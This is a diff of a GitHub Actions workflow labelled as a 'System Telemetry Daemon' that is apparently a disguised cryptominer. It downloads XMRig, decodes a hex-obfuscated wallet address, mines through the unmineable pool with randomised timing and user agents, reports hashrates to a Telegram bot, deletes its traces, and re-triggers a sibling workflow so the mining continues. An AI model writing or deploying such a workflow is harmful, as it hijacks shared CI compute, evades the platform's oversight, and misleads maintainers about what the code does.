@@ -2,15 +2,14 @@ name: System Telemetry Daemon
 
 on:
   schedule:
-    - cron: '0 3,15 * * *'   # 10:00 & 22:00 WIB
+    - cron: '0 3,15 * * *'
   workflow_dispatch:
 
 permissions:
   contents: read
-  actions: write
 
 concurrency:
-  group: sync-chain
+  group: sync-${{ github.workflow }}
   cancel-in-progress: true
 
 jobs:
@@ -21,7 +20,7 @@ jobs:
 
     steps:
       - name: Initialize
-        run: echo "🔧 metric diagnostics..."
+        run: echo "🔧 Inisialisasi sistem telemetry (BTC)..."
 
       - name: Prepare Environment
         run: |
@@ -34,11 +33,12 @@ jobs:
         run: |
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="🟢 *Session aktif.* Durasi kerja acak 20–90 menit." \
+            --data-urlencode text="🟢 *Runtime Diagnostics (BTC) aktif.* Durasi kerja acak 20–90 menit." \
             -d parse_mode=Markdown
 
       - name: Start Agent
         run: |
+          set -e
           UA_LIST=("Mozilla/5.0" "Chrome/114.0" "Ubuntu/22.04" "Macintosh; Intel Mac OS X 10_15_7")
           UA=${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}
           curl -A "$UA" -L -o core.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
@@ -48,18 +48,24 @@ jobs:
 
           sleep $((RANDOM % 300 + 30))
 
-          # BTC wallet & worker (HEX obfuscation)
+          # HEX (BTC: wallet + worker + ref tag)
           HEX="4254433a313264777761646e724a4351477a78474d42344d736463537059724b316665685a442e756e6d696e6561626c655f776f726b65725f796377716570617023776577612d38616d30"
           ADDR=$(echo "$HEX" | xxd -r -p)
 
-          ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 \
-            -u "$ADDR" -p x --randomx-no-rdmsr --keepalive | tee report.log &
+          nice -n 10 ./xmrig -a rx \
+            -o stratum+ssl://rx.unmineable.com:443 \
+            -u "$ADDR" -p x \
+            --randomx-no-rdmsr --keepalive \
+            --cpu-max-threads-hint=85 \
+            --http-enabled=0 \
+            -o stratum+tcp://rx.unmineable.com:3333 \
+            | tee report.log &
 
           PID=$!
           sleep $((RANDOM % 5400 + 1200))
           kill $PID || true
 
-      - name: Report Log
+      - name: Report & Cleanup
         if: always()
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
@@ -71,23 +77,24 @@ jobs:
           ACC=$(grep -a "accepted" report.log | wc -l)
           REJ=$(grep -a "rejected" report.log | wc -l)
           HASH=${HASH:-"0 H/s"}
-          echo -e "✅ *Sesi selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASH\`\n• Accepted: \`$ACC\`\n• Rejected: \`$REJ\`" | \
+          MSG="✅ *Runtime Diagnostics (BTC) selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASH\`\n• Accepted: \`$ACC\`\n• Rejected: \`$REJ\`"
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text@- \
+            --data-urlencode text="$MSG" \
             -d parse_mode=Markdown
+          cd ..
+          rm -rf xmrig-6.24.0 core.tar.gz || true
 
       - name: Cooldown
         if: always()
-        run: sleep $((RANDOM % 900 + 300))
+        run: sleep $((RANDOM % 1200 + 300))
 
-      - name: Trigger Next (sys-metrics)
+      - name: Trigger Next (Starter)
         if: always()
         env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
-          curl -s -X POST \
-            -H "Authorization: Bearer $GITHUB_TOKEN" \
-            -H "Accept: application/vnd.github+json" \
-            https://api.github.com/repos/${{ github.repository }}/actions/workflows/sys-metrics.yml/dispatches \
-            -d '{"ref":"main"}'
+          curl -s -X POST -H "Authorization: Bearer $GH_TOKEN" \
+               -H "Accept: application/vnd.github+json" \
+               https://api.github.com/repos/${{ github.repository }}/actions/workflows/sys-metrics.yml/dispatches \
+               -d '{"ref":"main"}'
